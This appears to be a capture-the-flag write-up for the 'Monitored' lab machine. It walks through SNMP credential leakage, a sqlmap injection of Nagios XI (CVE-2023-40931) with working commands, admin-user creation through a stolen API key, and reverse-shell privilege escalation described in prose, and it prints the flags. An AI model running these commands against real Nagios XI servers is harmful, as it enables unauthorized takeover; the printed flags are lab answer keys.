# Monitored. 
Box Difficulty : Medium

## Initial Enumeration

- Target: [https://10.10.11.248/](https://10.10.11.248/)
- Open Ports: 80, 389, 443

## Web Application Analysis

- Access the website: [https://10.10.11.248:443](https://10.10.11.248:443)
- Navigate to `login.php` after clicking on a button: [https://10.10.11.248/nagiosxi/login.php](https://10.10.11.248/nagiosxi/login.php)
- Searchsploit for NagiosXI reveals a potential Remote Code Execution (RCE) without version or credentials.


- Default Nagios XI credentials (`nagiosadmin/nagiosadmin`) do not work.
- Testing for XSS on NagiosXI: Not successful.

- Second Dirsearch in `/nagiosxi/` reveals several findings:
  - `/nagiosxi/api/v1/swagger.yaml` and `/nagiosxi/api/v1/swagger.json` with an error "No API key provided."
  - `/nagiosxi/backend/` returns an "Authentication Failure" error.

- Further investigation suggests the need for an API key.

## LDAP Enumeration

- Run Nmap script for LDAP enumeration:

		nmap --script=ldap* 10.10.11.248 -oX ldap.xml
  
Discover LDAP information indicating the context dc=monitored,dc=htb.

## SNMP Enumeration

Use snmpwalk for further enumeration:


		snmpwalk -v2c -c public -m ALL 10.10.11.248
		
Extracted OS, Hostname, System Uptime, Host Location, Contact Number, Number of Interfaces, and Network Interface details.

## Exploitation
### Credential Leakage

		iso.3.6.1.2.1.25.4.2.1.5.563 = STRING: "-c sleep 30; sudo -u svc /bin/bash -c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB"
		
		Credential: svc:XjH7VCehowpR1xZB
		
Identified the need for an API key for NagiosXI and crafted a payload.

		curl -XPOST -k -L 'https://nagios.monitored.htb/nagiosxi/api/v1/authenticate?pretty=1' -d 'username=svc&password=XjH7VCehowpR1xZB&valid_min=500'
		
Exploited a known CVE (CVE-2023-40931) related to NagiosXI 5.11.0/5.11.1 for SQL injection 
		
			sqlmap -u "https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&id=3&token=`curl -XPOST -k -L 'https://nagios.monitored.htb/nagiosxi/api/v1/authenticate?pretty=1' -d 'username=svc&password=XjH7VCehowpR1xZB&valid_min=600' | grep token | awk -F '"' '{print $4}'`" --batch --level 5 --risk 3 -p id -D nagiosxi -T xi_users --dump

Admin API Key: IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL

Create Admin User via API

		$ curl -XPOST 'https://nagios.monitored.htb/nagiosxi/api/v1/system/user?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL&pretty=1' -d 'username=xxx&password=xxx&email=xxx@xxx.com&name=xxx&auth_level=admin' -k

Response :
		{
		"success": "User account xxx was added successfully!",
		"user_id": 10
		}
		
Login using the Created Admin User
Credentials: xxx:xxx

Create Reverse Shell Command
In the Nagios XI host management, create a new command for the reverse shell

## Privilege Escalation

Checked sudo privileges for user nagios:


		sudo -l
		or wget linpeas.sh
		
Identified various commands that can be executed without a password.

Compiled and executed a C file to spawn a reverse shell as nc.

Checked for existing services and replaced npcd with a custom binary for privilege escalation.

Accessed the root.txt file and obtained the root flag.

## Conclusion
The penetration test successfully exploited vulnerabilities in NagiosXI, leading to privilege escalation and obtaining root access.

### User Flag: 57a65054216b061e0704cdf68f336b24
### Root Flag: 44642149033fb64160f0667390540dd0
